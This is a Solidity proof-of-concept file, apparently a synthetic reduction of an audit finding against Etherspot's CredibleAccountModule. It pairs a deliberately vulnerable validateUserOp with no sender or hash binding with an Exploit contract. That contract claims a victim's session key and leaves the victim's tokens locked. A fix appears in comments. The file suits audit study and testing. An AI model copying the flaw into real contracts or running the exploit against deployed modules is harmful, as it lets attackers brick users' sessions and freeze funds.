// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Etherspot CredibleAccountModule - [H-01] No check for userOp/userOpHash
    mismatch nor validity of the sender
    (Shieldify Security Review; finding #61411)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: validateUserOp recovers the sessionKeySigner from the supplied
    userOpHash and then mutates session state from the supplied userOp, but
    never checks (1) userOp.sender == msg.sender, nor (2) that userOpHash is
    the hash of that userOp. An attacker can call the module directly with a
    victim's valid (op, hash) pair, claim the session, and brick the real
    smart-account execution (session already claimed / tokens locked).

    The missing-check site is marked @> VULN.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal PackedUserOperation surface used by the module.
struct PackedUserOperation {
    address sender;
    uint256 nonce;
    bytes initCode;
    bytes callData;
    bytes32 accountGasLimits;
    uint256 preVerificationGas;
    bytes32 gasFees;
    bytes paymasterAndData;
    bytes signature;
}

uint256 constant VALIDATION_SUCCESS = 0;
uint256 constant VALIDATION_FAILED = 1;

/// @notice Reduced CredibleAccountModule - session-key claim without sender/hash checks.
contract CredibleAccountModule {
    mapping(address => bool) public sessionEnabled; // sessionKey => enabled
    mapping(address => bool) public sessionClaimed; // sessionKey => claimed
    mapping(address => address) public sessionOwner; // sessionKey => modular account
    mapping(address => uint256) public lockedTokens; // modular account => locked amount

    event SessionClaimed(address sessionKey, address by);

    function enableSessionKey(address sessionKey, address account, uint256 locked) external {
        sessionEnabled[sessionKey] = true;
        sessionOwner[sessionKey] = account;
        lockedTokens[account] = locked;
    }

    function isSessionClaimed(address sessionKey) external view returns (bool) {
        return sessionClaimed[sessionKey];
    }

    function validateSessionKeyParams(address sessionKeySigner, PackedUserOperation calldata userOp)
        public
        view
        returns (bool)
    {
        if (!sessionEnabled[sessionKeySigner]) return false;
        if (sessionClaimed[sessionKeySigner]) return false;
        // Real module checks callData / token amounts etc. - simplified:
        // session must belong to userOp.sender
        if (sessionOwner[sessionKeySigner] != userOp.sender) return false;
        return true;
    }

    /// @notice Verbatim structure of CredibleAccountModule.validateUserOp (L272-L273).
    function validateUserOp(PackedUserOperation calldata userOp, bytes32 userOpHash)
        external
        returns (uint256)
    {
        if (userOp.signature.length < 65) return VALIDATION_FAILED;
        bytes memory sig = _digestSignature(userOp.signature);
        // >> address sessionKeySigner = ECDSA.recover(ECDSA.toEthSignedMessageHash(userOpHash), sig);
        address sessionKeySigner = _recover(userOpHash, sig);
        // >> if (!validateSessionKeyParams(sessionKeySigner, userOp)) {
        if (!validateSessionKeyParams(sessionKeySigner, userOp)) {
            return VALIDATION_FAILED;
        }
        // Missing: require(userOp.sender == msg.sender) and userOpHash == hash(userOp)
        // FIX: require(userOp.sender == msg.sender, "sender");
        //      require(userOpHash == getUserOpHash(userOp), "hash mismatch");

        // Claim session (releases / consumes the session key path)
        sessionClaimed[sessionKeySigner] = true; // @> VULN: claims session without binding msg.sender to userOp.sender / hash
        // In the real module this also releases tokens to the solver from callData;
        // here we model the claim itself as the critical state transition.
        emit SessionClaimed(sessionKeySigner, msg.sender);
        return VALIDATION_SUCCESS;
    }

    /// @dev Mock ECDSA: signature is 65 bytes with the session key address in the first 20.
    function _recover(bytes32 /*userOpHash*/, bytes memory sig) internal pure returns (address) {
        // Real code: ECDSA.recover(ECDSA.toEthSignedMessageHash(userOpHash), sig)
        // Synthetic: embed signer in signature so we stay cheatcode-free.
        address signer;
        assembly {
            signer := shr(96, mload(add(sig, 32)))
        }
        return signer;
    }

    function _digestSignature(bytes calldata signature) internal pure returns (bytes memory) {
        return signature;
    }

    /// @dev Real SCW path: only succeeds if session not yet claimed.
    function executeWithSession(address sessionKey) external returns (bool) {
        require(msg.sender == sessionOwner[sessionKey], "not account");
        require(sessionEnabled[sessionKey], "disabled");
        require(!sessionClaimed[sessionKey], "already claimed");
        sessionClaimed[sessionKey] = true;
        // Would release locked tokens to solver - session consumed legitimately
        lockedTokens[msg.sender] = 0;
        return true;
    }
}

/// @dev Victim modular smart-contract wallet.
contract ModularAccount {
    CredibleAccountModule public immutable module;
    address public owner;

    constructor(CredibleAccountModule m) {
        module = m;
        owner = msg.sender;
    }

    function installAndEnable(address sessionKey, uint256 locked) external {
        module.enableSessionKey(sessionKey, address(this), locked);
    }

    function executeUserOp(address sessionKey) external returns (bool) {
        return module.executeWithSession(sessionKey);
    }
}

/// @notice Attacker consumes victim session by calling validateUserOp directly.
contract Exploit {
    CredibleAccountModule public module; // CREATE nonce 1
    ModularAccount public scw; // CREATE nonce 2

    address public constant SESSION_KEY = address(0x5E55);
    address public constant ATTACKER = address(0xA77AC4);
    address public constant SOLVER = address(0x5017E8);

    uint256 public constant LOCKED = 1000;

    bool public sessionClaimedByAttacker;
    bool public victimExecuteReverted;
    uint256 public lockedAfterAttack;

    constructor() {
        module = new CredibleAccountModule();
        scw = new ModularAccount(module);
    }

    function run() external {
        // 1. Victim SCW enables a session key with locked tokens for a solver claim
        scw.installAndEnable(SESSION_KEY, LOCKED);
        require(module.lockedTokens(address(scw)) == LOCKED, "locked");
        require(!module.isSessionClaimed(SESSION_KEY), "fresh");

        // 2. Craft the legitimate userOp the solver/session would submit (callData
        //    would transfer tokens to solver - abstracted).
        PackedUserOperation memory op;
        op.sender = address(scw);
        op.nonce = 0;
        op.callData = abi.encodeWithSignature("claimTo(address)", SOLVER);
        // Signature embeds SESSION_KEY (mock recover)
        // 65-byte mock signature: first 20 bytes = session key address, rest zero
        bytes memory sig = new bytes(65);
        for (uint256 i = 0; i < 20; i++) {
            sig[i] = bytes20(SESSION_KEY)[i];
        }
        op.signature = sig;

        bytes32 hash = keccak256(abi.encode(op.sender, op.nonce, op.callData));

        // 3. Attacker calls the module DIRECTLY (msg.sender = attacker, not scw)
        //    with the victim's valid (op, hash) - no sender/hash binding check.
        //    In the real PoC: vm.prank(attacker); cam.validateUserOp(op, hash);
        (bool ok, bytes memory ret) = address(module).call(
            abi.encodeWithSelector(CredibleAccountModule.validateUserOp.selector, op, hash)
        );
        require(ok, "validateUserOp should succeed for attacker");
        uint256 validation = abi.decode(ret, (uint256));
        require(validation == VALIDATION_SUCCESS, "validation ok");

        sessionClaimedByAttacker = module.isSessionClaimed(SESSION_KEY);
        require(sessionClaimedByAttacker, "session claimed by attacker");

        // 4. Real SCW can no longer execute - session already claimed
        (bool execOk,) = address(scw).call(abi.encodeWithSelector(ModularAccount.executeUserOp.selector, SESSION_KEY));
        victimExecuteReverted = !execOk;
        require(victimExecuteReverted, "victim execution must fail");

        lockedAfterAttack = module.lockedTokens(address(scw));
        // Tokens remain locked on the account (session burned without legitimate release)
        require(lockedAfterAttack == LOCKED, "tokens still locked - victim cannot release via session");
    }
}
